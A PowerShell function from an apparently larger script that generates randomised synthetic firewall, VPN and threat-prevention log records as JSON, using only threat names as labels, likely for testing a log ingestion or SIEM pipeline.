# ---------- FwVendor2 ----------
function New-FwVendor2Records {
    $records = @()
    $categories = @("Firewall","VPN","IPS","Application Control","URL Filtering","Anti-Bot","Anti-Virus","Threat Emulation")
    $bladeMap   = @{
        "Firewall"="Network Policy"; "VPN"="Remote Access"; "IPS"="Intrusion Prevention"
        "Application Control"="App Ctrl"; "URL Filtering"="URLF"
        "Anti-Bot"="Anti-Bot"; "Anti-Virus"="Anti-Virus"; "Threat Emulation"="TE"
    }
    $ruleNames  = @("Allow_Corp_Internet","Block_Tor","Allow_VPN_Split","Deny_All","Allow_DMZ_Web","Block_P2P","Alert_Sensitive_Servers")
    $vpnSites   = @("Corp-HQ","Branch-Office-1","Cloud-Hub","HomeOffice-$(RandInt 1 99)")
    $urlCats    = @("Social Media","Gambling","Malware Sites","Phishing","Anonymizers","Productivity","Cloud Storage")
    $apps       = @("WhatsApp","BitTorrent","TeamViewer","RDP","Zoom","SharePoint","GitHub","Tor Browser","ProtonVPN")
    $threats    = @("Mirai.Botnet.C2","Emotet.Downloader","CobaltStrike.Beacon","Log4Shell.Exploit","ZeroLogon.Attempt","CVE-2024-$(RandInt 1000 9999)")
    $actions    = @("Accept","Drop","Reject","Encrypt","Decrypt","VPN Encrypt")

    for ($i = 0; $i -lt $RecordsPerVendor; $i++) {
        $ts      = Get-RandomTs
        $dev     = Get-RandomDevice
        $user    = Get-RandomUser
        $cat     = Pick $categories
        $sev     = Get-WeightedSeverity
        $action  = Pick $actions
        $extIP   = Get-RandomExtIP
        $sport   = RandInt 1024 65535
        $dport   = Pick @(80,443,22,3389,53,3000,8080,8443,1194,4500,500,5432,6379,1433)
        $proto   = Pick @("TCP","UDP","ICMP","ESP")
        $rule    = Pick $ruleNames
        $blade   = $bladeMap[$cat]
        $pktIn   = RandInt 1 500
        $pktOut  = RandInt 1 200
        $bytesIn = $pktIn * (RandInt 64 1500)
        $evtId   = "CP-$(New-Guid8)"

        $rawPayload = @{
            EventId         = $evtId
            Vendor          = "FwVendor2"
            Product         = "VPN-1 & FireWall-1"
            Blade           = $blade
            Category        = $cat
            RuleName        = $rule
            RuleNum         = RandInt 1 200
            Action          = $action
            Severity        = $sev
            SeverityNum     = Get-SeverityNum $sev
            DeviceName      = $dev.Name
            DeviceIP        = $dev.IP
            DeviceOS        = $dev.OS
            DeviceSite      = $dev.Site
            UserId          = $user.Id
            UserName        = $user.Name
            UserDept        = $user.Dept
            UserPriv        = $user.Priv
            SourceIP        = if ((RandInt 0 1) -eq 0) { $dev.IP } else { $extIP }
            DestIP          = if ($action -eq "Accept") { Get-RandomExtIP } else { $extIP }
            Protocol        = $proto
            SourcePort      = $sport
            DestPort        = $dport
            PacketsIn       = $pktIn
            PacketsOut      = $pktOut
            BytesIn         = $bytesIn
            BytesOut        = $bytesIn * (RandInt 1 4)
            NatSrc          = if ((RandInt 0 1) -eq 1) { "10.0.0.$(RandInt 1 254)" } else { $null }
            VpnSite         = if ($cat -eq "VPN") { Pick $vpnSites } else { $null }
            UrlCategory     = if ($cat -eq "URL Filtering") { Pick $urlCats } else { $null }
            DnsQueryFQDN    = if ($cat -eq "URL Filtering") { $cpDnsRec = if ((RandInt 0 3) -eq 0) { Get-ThreatDnsRecord } else { Get-RandomDnsRecord }; $cpDnsRec.FQDN } else { $null }
            DnsResolvedIP   = if ($cat -eq "URL Filtering") { $cpDnsRec.IP } else { $null }
            DnsCategory     = if ($cat -eq "URL Filtering") { $cpDnsRec.Category } else { $null }
            DnsRType        = if ($cat -eq "URL Filtering") { $cpDnsRec.RType } else { $null }
            DnsTTL          = if ($cat -eq "URL Filtering") { $cpDnsRec.TTL } else { $null }
            DnsVendor       = if ($cat -eq "URL Filtering") { $cpDnsRec.Category } else { $null }
            Application     = if ($cat -eq "Application Control") { Pick $apps } else { $null }
            ThreatName      = if ($cat -in @("IPS","Anti-Bot","Anti-Virus","Threat Emulation")) { Pick $threats } else { $null }
            Confidence      = if ($cat -in @("IPS","Anti-Bot","Anti-Virus","Threat Emulation")) { Pick @("Low","Medium","High") } else { $null }
            PolicyName      = "Standard_$(RandInt 1 5)"
            LogType         = "Log"
            SessionId       = New-Guid8
        } | ConvertTo-Json -Compress

        $records += @{
            TimeGenerated = Get-IsoTs $ts
            RawData       = $rawPayload
            SourceVendor  = "FwVendor2"
            FileName      = "FwVendor2-fw-$($ts.ToString('yyyyMMdd')).log"
        }
    }
    return $records
}

